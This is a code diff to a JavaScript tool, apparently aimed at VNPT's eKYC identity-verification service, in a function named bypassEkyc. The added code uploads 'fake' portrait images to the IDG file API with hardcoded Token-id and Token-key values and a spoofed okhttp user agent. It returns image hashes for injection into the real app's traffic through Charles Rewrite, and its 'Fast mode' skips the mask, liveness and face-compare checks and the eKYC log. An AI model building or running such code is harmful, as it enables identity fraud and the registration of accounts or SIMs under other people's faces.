@@ -420,7 +420,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         <img src="${src}" alt="Hồ sơ">
                         <div class="image-info">
                             <p title="${fileName}">${fileName}</p>
-                            <div style="display:flex; gap:5px; width:100%; justify-content:center;">
+                            <div style="display:flex; gap:5px; width:100%; justify-content:center; flex-wrap:wrap;">
                                 <a href="${src}" download="${fileName}" class="btn-download" title="Tải ảnh này">
                                     <i class="fa-solid fa-download"></i>
                                 </a>
@@ -430,10 +430,14 @@ document.addEventListener('DOMContentLoaded', () => {
                                 <button type="button" class="btn-verify" style="background:linear-gradient(135deg,#00c896,#00a876);font-size:11px;" data-src="${src}" onclick="bypassEkyc('${phone}', this, true)" title="Fast mode: Bỏ qua AI (dùng khi real app đã tạo IDG session)">
                                     <i class="fa-solid fa-forward"></i> Fast
                                 </button>
+                                <button type="button" class="btn-verify" style="background:linear-gradient(135deg,#ff9800,#f57c00);font-size:11px;width:100%;margin-top:5px;" data-src="${src}" onclick="uploadAndGetHash(this)" title="Chỉ lấy Hash của ảnh này">
+                                    <i class="fa-solid fa-cloud-arrow-up"></i> Lấy Hash
+                                </button>
                             </div>
                         </div>
                     </div>
                 `;
+
             });
             subscriberImages.innerHTML = imgHtml;
         } else {
@@ -461,7 +465,71 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 });
 
+window.uploadAndGetHash = async function(btnElement) {
+    if (!btnElement) return alert('Chua chon anh nao!');
+    const imageSrc = btnElement.dataset.src;
+    if (!imageSrc) return alert("Khong tim thay du lieu anh!");
+
+    
+    // Get token
+    let idgToken = _cachedIdgToken;
+    if (!idgToken) {
+        alert('Dang lay Token. Vui long doi 1 giay va bam lai!');
+        prefetchIdgToken();
+        return;
+    }
+
+    try {
+        const { blob } = await new Promise((resolve, reject) => {
+            const img = new Image();
+            img.crossOrigin = 'Anonymous';
+            img.onload = () => {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = img.width; canvas.height = img.height;
+                ctx.drawImage(img, 0, 0);
+                canvas.toBlob(blob => resolve({ blob }), 'image/jpeg', 0.95);
+            };
+            img.onerror = () => reject(new Error("Loi tai anh"));
+            img.src = imageSrc;
+        });
+
+        const idgHeaders = {
+            'Authorization': idgToken,
+            'Connection': 'Keep-Alive',
+            'mac-address': localStorage.getItem('vnpt_device_id') || "0f8c2d3fb0c51653",
+            'Token-id': '04c0a953-7fb8-5461-e063-62199f0aeda6',
+            'Token-key': 'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKjy7FK9SegSCW0cuUIbEDUsbRZOcoxijNPLMfvgX+8/XA7HebHXMN4/PO5c5mwK31Yk31RKuMXYLLp6x6oZPDkCAwEAAQ==',
+            'User-Agent': 'okhttp/4.11.0'
+        };
+
+        let p_image_hash = '';
+        for (let addTry = 1; addTry <= 5; addTry++) {
+            const fd = new FormData();
+            fd.append('file', blob, 'portrait_full.jpg');
+            fd.append('title', 'portrait_full.jpg');
+            fd.append('description', 'portrait_full.jpg');
+            const afRes = await fetch('https://api.idg.vnpt.vn/file-service/v1/addFile', { method: 'POST', headers: idgHeaders, body: fd });
+            const afData = await afRes.json();
+            if (afData.object?.hash) {
+                p_image_hash = afData.object.hash;
+                const zone = p_image_hash.split('/')[0];
+                if (zone === 'zone2' || zone === 'zone3') break;
+            }
+        }
+        
+        if (p_image_hash) {
+            prompt('Đã upload thành công! Hãy copy Hash dưới đây để dùng trong Charles Rewrite:', p_image_hash);
+        } else {
+            alert('Upload thất bại. Vui lòng thử lại!');
+        }
+    } catch(e) {
+        alert('Lỗi: ' + e.message);
+    }
+};
+
 // ===== PRE-LOAD IDG TOKEN CACHE (cho Fast Mode khoi dong ngay) =====
+
 let _cachedIdgToken = null;
 let _cachedIdgTokenTime = 0;
 async function prefetchIdgToken() {
@@ -674,14 +742,13 @@ window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
         };
 
         let p_image_hash = '';
+        
         if (fastMode && realImageHash) {
-            // Fast Mode: bo qua upload IDG vi anh da duoc app that upload
             p_image_hash = realImageHash;
-            console.log('[IDG] ⚡ FAST MODE: Dung image hash tu app that:', p_image_hash);
-            btnElement.innerHTML = '<i class="fa-solid fa-forward"></i> Fast Mode: Bo qua upload IDG...';
+            console.log('⚡ [FAST MODE] Bỏ qua upload IDG, sử dụng hash gốc từ điện thoại:', p_image_hash);
         } else {
-            // 5. Upload anh len IDG - RETRY den khi lay zone2/zone3 (CCBS chi access duoc zone2/3)
-            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 5/13: Upload anh len IDG...';
+            // 5. Upload anh fake len IDG
+            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 5/13: Upload anh fake len IDG...';
             for (let addTry = 1; addTry <= 5; addTry++) {
                 const fd = new FormData();
                 fd.append('file', blob, 'portrait_full.jpg');
@@ -711,8 +778,8 @@ window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
                 }
             }
         }
-        console.log('[IDG] Final hash:', p_image_hash);
-
+        
+        console.log('[IDG] Final image hash:', p_image_hash);
 
         // IDG AI headers - Authorization DUNG token_ekyc (da xac minh giong real app)
         const idgAIHeaders = {
@@ -724,58 +791,69 @@ window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
         const bodyToken = idgSdkSessionToken || ekycSessionToken;
         console.log('[IDG] body.token source:', idgSdkSessionToken ? 'SDK input ✅' : 'init_log_uuid (se 401!)');
 
-        if (fastMode) {
-            console.log('[IDG] ⚡ FAST MODE: Bo qua mask/liveness/compare - dung IDG session tu real app');
-            btnElement.innerHTML = '<i class="fa-solid fa-forward"></i> Fast Mode: Bo qua AI checks...';
-        } else {
+        let maskData = {}, livenessData = {}, compareData = {};
+
+        if (!fastMode) {
             // 6. Mask check (IDG AI)
-            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 6/13: Kiem tra mask...';
+            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 6/13: Kiem tra mask (Inject)...';
             const maskRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/mask?challenge_code=${challengeCode}`, {
                 method: 'POST',
                 headers: idgAIHeaders,
                 body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
             });
-            const maskData = await maskRes.json().catch(() => ({}));
+            maskData = await maskRes.json().catch(() => ({}));
             console.log('[IDG] mask:', maskRes.status, maskData);
 
             // 7. Liveness check (IDG AI)
-            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 7/13: Kiem tra liveness...';
+            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 7/13: Kiem tra liveness (Inject)...';
             const livenessRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/liveness?challenge_code=${challengeCode}`, {
                 method: 'POST',
                 headers: idgAIHeaders,
                 body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
             });
-            const livenessData = await livenessRes.json().catch(() => ({}));
+            livenessData = await livenessRes.json().catch(() => ({}));
             console.log('[IDG] liveness:', livenessRes.status, livenessData);
 
             // 8. Compare face (IDG AI)
-            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 8/13: So sanh khuon mat...';
+            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 8/13: So sanh khuon mat (Inject)...';
             const compareRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/compare?challenge_code=${challengeCode}`, {
                 method: 'POST',
                 headers: idgAIHeaders,
                 body: JSON.stringify({ img_front: '', step_id: 0, token: bodyToken, img_face: p_image_hash, client_session: clientSession })
             });
-            const compareData = await compareRes.json().catch(() => ({}));
+            compareData = await compareRes.json().catch(() => ({}));
             console.log('[IDG] compare:', compareRes.status, compareData);
+        } else {
+            console.log('⚡ [FAST MODE] Bỏ qua 3 bước gọi API AI (mask, liveness, compare) vì app thật đã làm việc này.');
+            if (!realClientSession || !realChallengeCode) {
+                console.warn('⚠️ [CẢNH BÁO] Bạn đang dùng Fast Mode nhưng KHÔNG dán mã cURL! Các Session ID được tạo ngẫu nhiên sẽ KHÔNG khớp với app thật, có thể dẫn đến lỗi "Không lấy được ảnh chân dung" ở bước cuối.');
+            }
         }
 
 
-        // 9. Log eKYC ket qua AI len ONEBSS
-        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 9/13: Ghi log eKYC...';
-        await fetch('https://api-onebss.vnpt.vn/app-banhang/Ekyc/log_ekyc', {
-            method: 'POST',
-            headers: { ...baseHeaders, 'Content-Type': 'application/json' },
-            body: JSON.stringify({
+
+        if (!fastMode) {
+            // 9. Log eKYC ket qua AI len ONEBSS
+            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 9/13: Ghi log eKYC...';
+            const logEkycPayload = {
                 p_so_tb: phone,
                 p_image_hash: p_image_hash,
                 p_challenge_code: challengeCode,
                 p_client_session: clientSession,
+                menu_id: 810241,
                 p_liveness: JSON.stringify(typeof livenessData !== 'undefined' ? livenessData : {}),
                 p_compare: JSON.stringify(typeof compareData !== 'undefined' ? compareData : {}),
-                p_mask: JSON.stringify(typeof maskData !== 'undefined' ? maskData : {}),
-                menu_id: 810241
-            })
-        }).catch(e => console.warn('[log_ekyc] Loi:', e.message));
+                p_mask: JSON.stringify(typeof maskData !== 'undefined' ? maskData : {})
+            };
+
+            await fetch('https://api-onebss.vnpt.vn/app-banhang/Ekyc/log_ekyc', {
+                method: 'POST',
+                headers: { ...baseHeaders, 'Content-Type': 'application/json' },
+                body: JSON.stringify(logEkycPayload)
+            }).catch(e => console.warn('[log_ekyc] Loi:', e.message));
+        } else {
+            console.log('⚡ [FAST MODE] Bỏ qua ghi log eKYC vì app thật đã ghi.');
+        }
 
         // 10. Xin link Upload MinIO
         btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 10/13: Xin upload link...';
